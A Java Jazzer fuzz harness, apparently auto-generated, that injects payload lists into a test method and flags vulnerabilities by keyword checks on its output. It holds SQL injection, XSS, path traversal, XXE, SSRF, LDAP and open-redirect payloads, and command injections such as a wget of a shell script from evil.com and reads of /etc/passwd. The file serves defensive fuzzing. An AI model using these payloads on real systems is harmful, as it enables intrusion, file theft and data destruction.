package fuzz;

import com.code_intelligence.jazzer.api.*;
import security.SecurityDetector;
import security.SecurityDetector.SecurityIssue;
import java.lang.reflect.*;
import java.io.*;
import java.util.*;

/**
 * Comprehensive security test for: org.example.VulnerableTest.testInfiniteLoop
 * Tests: SQL Injection, XSS, Path Traversal, Command Injection, XXE, SSRF, etc.
 */
public class SecurityFuzz_0047 {

  // ========== SQL INJECTION PAYLOADS ==========
  private static final String[] SQL_PAYLOADS = {
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "1' AND 1=1--",
    "admin'--",
    "' UNION SELECT * FROM users--",
    "1' ORDER BY 10--",
    "' OR 1=1#",
    "1'; WAITFOR DELAY '00:00:05'--"
  };

  // ========== XSS PAYLOADS ==========
  private static final String[] XSS_PAYLOADS = {
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>"
  };

  // ========== PATH TRAVERSAL PAYLOADS ==========
  private static final String[] PATH_PAYLOADS = {
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "file:///etc/passwd"
  };

  // ========== COMMAND INJECTION PAYLOADS ==========
  private static final String[] CMD_PAYLOADS = {
    "; ls -la",
    "| whoami",
    "& dir",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "; wget http://evil.com/shell.sh",
    "|| cat /etc/passwd"
  };

  // ========== XXE PAYLOADS ==========
  private static final String[] XXE_PAYLOADS = {
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>",
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]>",
    "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">"
  };

  // ========== SSRF PAYLOADS ==========
  private static final String[] SSRF_PAYLOADS = {
    "http://localhost:8080/admin",
    "http://127.0.0.1:22",
    "http://169.254.169.254/latest/meta-data/",
    "http://192.168.1.1/admin",
    "http://10.0.0.1/internal",
    "file:///etc/passwd"
  };

  // ========== LDAP INJECTION PAYLOADS ==========
  private static final String[] LDAP_PAYLOADS = {
    "*)(uid=*))(|(uid=*",
    "admin)(&(password=*))",
    "*)(|(objectClass=*"
  };

  // ========== OPEN REDIRECT PAYLOADS ==========
  private static final String[] REDIRECT_PAYLOADS = {
    "http://evil.com",
    "//evil.com",
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>"
  };

  // ========== HARDCODED SECRETS PATTERNS ==========
  private static final String[] SECRET_PATTERNS = {
    "password",
    "secret",
    "api_key",
    "token",
    "credential"
  };

  private static ByteArrayOutputStream capturedOutput;
  private static PrintStream originalOut;
  private static PrintStream originalErr;

  public static void fuzzerTestOneInput(FuzzedDataProvider data) {
    try {
      // Choose payload category
      int category = data.consumeInt(0, 7);
      String payload;
      String payloadType;
      
      switch (category) {
        case 0:
          payload = SQL_PAYLOADS[data.consumeInt(0, SQL_PAYLOADS.length - 1)];
          payloadType = "SQL_INJECTION";
          break;
        case 1:
          payload = XSS_PAYLOADS[data.consumeInt(0, XSS_PAYLOADS.length - 1)];
          payloadType = "XSS";
          break;
        case 2:
          payload = PATH_PAYLOADS[data.consumeInt(0, PATH_PAYLOADS.length - 1)];
          payloadType = "PATH_TRAVERSAL";
          break;
        case 3:
          payload = CMD_PAYLOADS[data.consumeInt(0, CMD_PAYLOADS.length - 1)];
          payloadType = "COMMAND_INJECTION";
          break;
        case 4:
          payload = XXE_PAYLOADS[data.consumeInt(0, XXE_PAYLOADS.length - 1)];
          payloadType = "XXE";
          break;
        case 5:
          payload = SSRF_PAYLOADS[data.consumeInt(0, SSRF_PAYLOADS.length - 1)];
          payloadType = "SSRF";
          break;
        case 6:
          payload = LDAP_PAYLOADS[data.consumeInt(0, LDAP_PAYLOADS.length - 1)];
          payloadType = "LDAP_INJECTION";
          break;
        case 7:
          payload = REDIRECT_PAYLOADS[data.consumeInt(0, REDIRECT_PAYLOADS.length - 1)];
          payloadType = "OPEN_REDIRECT";
          break;
        default:
          payload = data.consumeString(256);
          payloadType = "RANDOM";
      }

      // Capture ALL output
      capturedOutput = new ByteArrayOutputStream();
      originalOut = System.out;
      originalErr = System.err;
      System.setOut(new PrintStream(capturedOutput));
      System.setErr(new PrintStream(capturedOutput));

      // Load target class
      Class<?> cls = Class.forName("org.example.VulnerableTest");
      Constructor<?> ctor = cls.getDeclaredConstructor();
      ctor.setAccessible(true);
      Object instance = ctor.newInstance();

      // Prepare parameters with payload
      Class<?>[] paramTypes = new Class<?>[] {String.class};

      Object[] args = new Object[1];
      args[0] = payload; // Inject payload here

      // Invoke method
      Method m = cls.getDeclaredMethod("testInfiniteLoop", paramTypes);
      m.setAccessible(true);
      Object result = m.invoke(instance, args);

      // Restore output
      System.setOut(originalOut);
      System.setErr(originalErr);
      String output = capturedOutput.toString();

      // ========== COMPREHENSIVE SECURITY ANALYSIS ==========
      List<SecurityIssue> issues = new ArrayList<>();

      // 1. SQL Injection Detection
      if (output.toLowerCase().contains("select") || 
          output.toLowerCase().contains("insert") ||
          output.toLowerCase().contains("update") ||
          output.toLowerCase().contains("delete") ||
          output.toLowerCase().contains("sql")) {
        SecurityIssue sql = SecurityDetector.detectSQLInjection(output, payload);
        if (sql != null) issues.add(sql);
      }

      // 2. XSS Detection
      if (output.contains("<") && output.contains(">")) {
        SecurityIssue xss = SecurityDetector.detectXSS(output, payload);
        if (xss != null) issues.add(xss);
      }

      // 3. Path Traversal Detection
      if (output.contains("/") || output.contains("\\") || 
          output.toLowerCase().contains("file") ||
          output.toLowerCase().contains("path")) {
        SecurityIssue path = SecurityDetector.detectPathTraversal(output, payload);
        if (path != null) issues.add(path);
      }

      // 4. Command Injection Detection
      if (output.toLowerCase().contains("command") ||
          output.toLowerCase().contains("exec") ||
          output.toLowerCase().contains("process")) {
        SecurityIssue cmd = SecurityDetector.detectCommandInjection(output, payload);
        if (cmd != null) issues.add(cmd);
      }

      // 5. XXE Detection
      if (payloadType.equals("XXE") && output.length() > 0) {
        SecurityIssue xxe = SecurityDetector.detectXXE(payload);
        if (xxe != null) issues.add(xxe);
      }

      // 6. SSRF Detection
      if (payloadType.equals("SSRF") || 
          output.toLowerCase().contains("http") ||
          output.toLowerCase().contains("url")) {
        SecurityIssue ssrf = SecurityDetector.detectSSRF(payload);
        if (ssrf != null) issues.add(ssrf);
      }

      // 7. Hardcoded Credentials Detection
      for (String pattern : SECRET_PATTERNS) {
        if (output.toLowerCase().contains(pattern) && 
            output.contains("=")) {
          issues.add(new SecurityIssue(
            "Hardcoded Credentials",
            "HIGH",
            "Sensitive data exposed in output",
            "Pattern: " + pattern + "\nOutput: " + output.substring(0, Math.min(200, output.length())),
            "Use environment variables or secure vault"
          ));
          break;
        }
      }

      // 8. Insecure Deserialization Detection
      if (args.length > 0 && args[0] instanceof byte[]) {
        SecurityIssue deser = SecurityDetector.detectInsecureDeserialization((byte[])args[0]);
        if (deser != null) issues.add(deser);
      }

      // 9. Information Disclosure Detection
      if (output.contains("Exception") || 
          output.contains("at java.") ||
          output.contains("Caused by")) {
        issues.add(new SecurityIssue(
          "Information Disclosure",
          "MEDIUM",
          "Stack trace exposed to output",
          "Stack trace may reveal sensitive information",
          "Log errors internally, show generic message to users"
        ));
      }

      // Report all found issues
      if (!issues.isEmpty()) {
        System.err.println("\n╔════════════════════════════════════════════════════════╗");
        System.err.println("║  🚨 SECURITY VULNERABILITY DETECTED!                   ║");
        System.err.println("╚════════════════════════════════════════════════════════╝");
        System.err.println("Method: org.example.VulnerableTest.testInfiniteLoop");
        System.err.println("Payload Type: " + payloadType);
        System.err.println("Payload: " + payload);
        System.err.println("\nVulnerabilities Found: " + issues.size());
        System.err.println("════════════════════════════════════════════════════════");
        
        for (int i = 0; i < issues.size(); i++) {
          SecurityIssue issue = issues.get(i);
          System.err.println("\n[" + (i+1) + "] " + issue);
        }
        
        System.err.println("\n════════════════════════════════════════════════════════\n");
        
        // Throw to create crash file
        throw new SecurityException("Security vulnerabilities detected: " + 
          issues.stream().map(i -> i.type).collect(java.util.stream.Collectors.joining(", ")));
      }

    } catch (InvocationTargetException ite) {
      Throwable cause = ite.getCause();
      if (cause instanceof SecurityException) {
        throw (SecurityException) cause;
      }
      // Ignore other exceptions
    } catch (SecurityException se) {
      throw se;
    } catch (Throwable t) {
      // Ignore reflection/other errors
    } finally {
      if (originalOut != null) System.setOut(originalOut);
      if (originalErr != null) System.setErr(originalErr);
    }
  }
}
